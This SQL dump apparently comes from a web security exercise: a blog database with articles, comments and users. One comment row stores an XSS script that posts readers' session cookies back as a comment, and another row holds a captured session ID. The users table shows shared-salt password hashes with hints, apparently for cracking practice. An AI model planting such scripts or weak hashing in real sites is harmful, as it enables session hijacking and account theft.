-- phpMyAdmin SQL Dump
-- version 4.2.12deb2+deb8u1
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Jul 11, 2016 at 03:32 PM
-- Server version: 5.5.49-0+deb8u1
-- PHP Version: 5.6.22-0+deb8u1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `dbname`
--

-- --------------------------------------------------------

--
-- Table structure for table `articles`
--

CREATE TABLE IF NOT EXISTS `articles` (
  `id` int(11) NOT NULL,
  `timestamp` bigint(20) NOT NULL,
  `author_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `articles`
--

INSERT INTO `articles` (`id`, `timestamp`, `author_id`, `title`, `body`) VALUES
(1, 1467812252, 1, 'My First Article', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. In egestas nulla eros, eget fringilla mi mollis vitae. Mauris porttitor hendrerit magna, eget viverra purus mattis in. Pellentesque faucibus consequat volutpat. Integer sit amet vulputate sem. Cras id laoreet lectus. Vestibulum convallis, libero ac bibendum aliquam, lacus nunc dapibus ante, ac tincidunt quam libero eget dui. Sed lectus turpis, lacinia et sollicitudin ullamcorper, tincidunt eu tellus. In hac habitasse platea dictumst. Maecenas cursus dolor at ante hendrerit, et molestie metus mollis. Maecenas facilisis egestas libero, in finibus nisl condimentum eget. Nam eu massa turpis. Donec tristique vitae leo sit amet vulputate.\r\n'),
(2, 1467813252, 2, 'My Second Article', 'Nam nec sagittis elit, id dictum eros. Cras pulvinar ex at dictum vehicula. Sed quis est a libero gravida tristique. Pellentesque ligula mauris, efficitur condimentum ipsum sagittis, bibendum placerat nulla. Nulla posuere eleifend metus nec laoreet. Morbi dolor urna, sagittis id ligula at, egestas bibendum neque. Donec vitae magna semper ante ornare feugiat et sed mauris. Cras sagittis turpis ut tristique fermentum. Praesent dignissim tellus nec velit tempus tincidunt.\r\n\r\nCras quis dapibus ipsum, quis rhoncus tellus. Vivamus ac efficitur nisl. Phasellus ultricies purus venenatis leo semper, vitae euismod arcu luctus. Donec malesuada blandit ligula vitae efficitur. Nam dui leo, fringilla quis tellus id, malesuada sagittis lectus. Integer convallis augue vestibulum, aliquet mauris a, ultricies risus. Donec consectetur gravida orci eu porttitor. Donec eget tincidunt lectus. Nunc non ornare lacus.\r\n\r\n'),
(3, 1467814252, 3, 'My Third Article', 'Nam nec sagittis elit, id dictum eros. Cras pulvinar ex at dictum vehicula. Sed quis est a libero gravida tristique. Pellentesque ligula mauris, efficitur condimentum ipsum sagittis, bibendum placerat nulla. Nulla posuere eleifend metus nec laoreet. Morbi dolor urna, sagittis id ligula at, egestas bibendum neque. Donec vitae magna semper ante ornare feugiat et sed mauris. Cras sagittis turpis ut tristique fermentum. Praesent dignissim tellus nec velit tempus tincidunt.\r\n\r\nCras quis dapibus ipsum, quis rhoncus tellus. Vivamus ac efficitur nisl. Phasellus ultricies purus venenatis leo semper, vitae euismod arcu luctus. Donec malesuada blandit ligula vitae efficitur. Nam dui leo, fringilla quis tellus id, malesuada sagittis lectus. Integer convallis augue vestibulum, aliquet mauris a, ultricies risus. Donec consectetur gravida orci eu porttitor. Donec eget tincidunt lectus. Nunc non ornare lacus.\r\n\r\n');

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE IF NOT EXISTS `comments` (
  `id` int(11) NOT NULL,
  `article_id` int(11) NOT NULL,
  `author_id` int(11) NOT NULL,
  `timestamp` bigint(20) NOT NULL,
  `body` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `article_id`, `author_id`, `timestamp`, `body`) VALUES
(8, 1, 2, 1467821812, 'Great article. The most interesting placeholder text I''ve read in my entire life.'),
(9, 2, 3, 1467821925, 'This is a great first article. The only thing I can think it''s missing is... any meaning at all.'),
(10, 1, 1, 1467821937, 'You''re right, Matt.'),
(0, 2, 1, 1468251161, '\r\n                <script>\r\n                    jQuery.post(\r\n                      "?page=comment.php",\r\n                      {\r\n                        "article_id": 1,\r\n                        "body": "My cookies are: " + document.cookie\r\n                      }\r\n                    )\r\n                </script>\r\n        '),
(0, 1, 1, 1468251161, 'My cookies are: PHPSESSID=d3njstr9g9k2eeptmbc223p4b2');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
`id` int(11) NOT NULL,
  `username` varchar(32) NOT NULL,
  `password` varchar(255) NOT NULL,
  `role` varchar(32) NOT NULL DEFAULT 'user',
  `hint` varchar(255) NOT NULL,
  `salt` varchar(255) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `role`, `hint`, `salt`) VALUES
(1, 'admin', 'ad0757326e1e67b57628e393a17e96a45a7c60164508420fcaf1fb0b5603d49b', 'staff', 'my favourite book', 'This is the salt for exercise 2'),
(2, 'matt', 'c074df5ddfbe37806adf92bed8307e887b901b4991a40535228f1a8a2fbe83b6', 'user', 'what i love most', 'This is the salt for exercise 2'),
(3, 'john', 'c1d56af5a8c2651f281fca0c7be811dc99aa38e54daf6e68acba284a691842ee', 'user', 'ditto', 'This is the salt for exercise 2'),
(16, 'a001', 'f0d78f50ccfb95a07c19c44d8cafca4f55f3c379aed16a3cf13fbba4ee994f53', 'staff', '', 'This is the salt for exercise 2'),
(17, 'a002', 'c1d56af5a8c2651f281fca0c7be811dc99aa38e54daf6e68acba284a691842ee', 'user', 'My usual password', 'This is the salt for exercise 2'),
(18, 'a003', 'c6a28b5dc80d98b97ffb3a3b9113f6024a0e3b97fcbc3a1117291f1c3bc0f309', 'user', 'He''d never give you up', 'This is the salt for exercise 2'),
(19, 'a004', '137917844ec56a3aef06c673b14296d3498f09b9334643d1711cf8a3d5ea2ea0', 'user', '', 'This is the salt for exercise 2'),
(20, 'a005', 'c1d56af5a8c2651f281fca0c7be811dc99aa38e54daf6e68acba284a691842ee', 'user', '', 'This is the salt for exercise 2'),
(21, 'a006', 'b0fd932b42cb5eaa5df6edc785360b42f81b6995094bbe224a92e967e446dd7a', 'user', 'Best football team', 'This is the salt for exercise 2'),
(22, 'a007', '0aa5ca601ff4efc9ed402e275a2e967727c228b1465c51282e19936915cb99b1', 'user', 'Favourite biscuit', 'This is the salt for exercise 2'),
(23, 'a008', 'd4926f3460c6466652b6ad8ef86d01a67d24891dc346d36da8a02c5faf7d0b4a', 'user', '', 'This is the salt for exercise 2'),
(24, 'a009', 'f0d78f50ccfb95a07c19c44d8cafca4f55f3c379aed16a3cf13fbba4ee994f53', 'user', 'Shake It Off', 'This is the salt for exercise 2'),
(25, 'a010', '8f7a9a11649a62ec58cca508af6d5d691d916d7b1d2a6112e398505c20c2747f', 'user', '', 'This is the salt for exercise 2'),
(26, 'a011', 'a96051a7975b9335ac84b63b3b1e505a45714c18668ac4b04e15800ca1fc51b2', 'user', '123', 'This is the salt for exercise 2'),
(27, 'a012', 'faff3df8bcd19faae22acd433e0636979ec907af6fef30751f1a0612fe5b629b', 'staff', '', 'This is the salt for exercise 2'),
(28, 'a013', 'f2e39dfdcbd9d1aa38097372642b355eb2330db14415288a98190af2a1c3d50c', 'user', 'Childhood dog', 'This is the salt for exercise 2'),
(29, 'a014', 'c1d56af5a8c2651f281fca0c7be811dc99aa38e54daf6e68acba284a691842ee', 'user', '', 'This is the salt for exercise 2'),
(30, 'a015', 'f0d78f50ccfb95a07c19c44d8cafca4f55f3c379aed16a3cf13fbba4ee994f53', 'user', 'Favourite programming language', 'This is the salt for exercise 2'),
(31, 'a016', '0503119ed41758007418a619a730d1769cf14860e5c2ee7c63fec07408f50e16', 'user', 'Web comic', 'This is the salt for exercise 2'),
(32, 'a017', '6138713d6348742be9057d72abccf62c0aea85f301bc98e241dbd7d2fb60a084', 'user', 'River', 'This is the salt for exercise 2'),
(33, 'a018', '8d04afe1e6e71b17defca7ba4932042869cb144a440775aa974c9ac18d90f8f8', 'user', 'Who?', 'This is the salt for exercise 2'),
(34, 'a019', 'f930987f760bdec540657c43c0205c060b8e1ec5c76dcdc3de30946bcccae99d', 'user', '', 'This is the salt for exercise 2'),
(35, 'a020', '70e9299e9167af67a01b0e9229b3226b49069a84f3609b966c5b362d8ea2bbfc', 'user', 'Favourite band', 'This is the salt for exercise 2');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `users`
--
ALTER TABLE `users`
 ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `username` (`username`), ADD KEY `role` (`role`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=36;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
